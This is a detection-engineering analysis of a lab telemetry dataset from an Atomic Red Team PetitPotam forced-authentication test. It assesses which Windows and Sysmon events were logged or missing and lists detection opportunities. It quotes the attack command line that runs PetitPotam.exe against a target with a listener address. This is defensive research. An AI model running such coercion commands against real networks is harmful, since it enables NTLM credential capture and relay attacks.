# T1187-1: Forced Authentication — PetitPotam

## Technique Context

T1187 Forced Authentication is a credential access technique where attackers force a target machine to authenticate to an attacker-controlled server, potentially revealing NTLM hashes or enabling relay attacks. PetitPotam is a specific implementation that abuses the MS-EFSRPC (Encrypting File System Remote Protocol) to coerce authentication from domain controllers or other systems. The technique gained significant attention in 2021 as a tool for Active Directory compromise chains, particularly when combined with Active Directory Certificate Services (ADCS) attacks. Detection engineers typically focus on monitoring for unexpected authentication requests, unusual RPC calls to the EFS service, and network connections to suspicious destinations.

## What This Dataset Contains

The telemetry shows a complete PetitPotam execution sequence. Security event 4688 captures the PowerShell command line `"powershell.exe" & {& "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PetitPotam.exe" 10.0.0.3 10.0.0.2 1` with parameters indicating the target server (10.0.0.3), listener address (10.0.0.2), and pipe number (1). Sysmon EID 1 captures the same process creation with the full command line visible. PowerShell script block logging (EID 4104) records the exact script content: `& "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PetitPotam.exe" 10.0.0.3 10.0.0.2 1`. The dataset shows multiple PowerShell processes (PIDs 31268, 43888, 44992, 8492) with extensive .NET runtime DLL loading captured in Sysmon EID 7 events. Notably missing from the dataset are any Sysmon EID 1 events for the actual PetitPotam.exe process execution, indicating the sysmon-modular config filtered it out as PetitPotam.exe isn't a known LOLBin pattern.

## What This Dataset Does Not Contain

The dataset lacks the most critical evidence of PetitPotam execution. There are no Sysmon process creation events for PetitPotam.exe itself, likely because the sysmon-modular configuration uses include-mode filtering that only captures known-suspicious binaries. No network connection events (Sysmon EID 3) are present showing the actual RPC connections to the target server at 10.0.0.3. Missing are any DNS resolution events (Sysmon EID 22) for the target addresses. The dataset contains no evidence of successful authentication coercion, NTLM hash capture, or authentication events (Security EID 4624/4625) that would indicate the technique's success. File system events related to the PetitPotam.exe binary itself are absent, and there are no RPC-related events or EFS service interactions that would be the core indicators of this attack.

## Assessment

This dataset has limited utility for building comprehensive PetitPotam detections. While it captures the PowerShell execution wrapper and command-line arguments clearly, it misses the actual technique execution and its network effects. The visible telemetry is primarily the delivery mechanism (PowerShell) rather than the attack technique itself. For detection engineering, this data would only support detecting the specific Atomic Red Team test pattern rather than real-world PetitPotam usage. A stronger dataset would require modified Sysmon configuration to capture all process executions, network monitoring for RPC traffic, and ideally a multi-host setup showing both the attacking workstation and target domain controller with authentication events.

## Detection Opportunities Present in This Data

1. **PowerShell Command Line Detection**: Security EID 4688 and Sysmon EID 1 both capture the full command line with "PetitPotam.exe" string and IP address parameters, enabling detection of this specific tool execution pattern.

2. **PowerShell Script Block Analysis**: PowerShell EID 4104 events contain the exact script content showing PetitPotam.exe execution with target and listener IP addresses, allowing for content-based detection rules.

3. **Suspicious Binary Path Detection**: The command line reveals execution from `C:\AtomicRedTeam\atomics\..\ExternalPayloads\` directory, which is a clear indicator of red team testing activity.

4. **Process Chain Analysis**: Sysmon process creation events show PowerShell spawning child PowerShell processes, indicating potential script-based attack delivery that warrants investigation.

5. **File Path Pattern Matching**: References to "ExternalPayloads" directory and "PetitPotam.exe" binary provide specific IOCs for hunting and prevention rules.
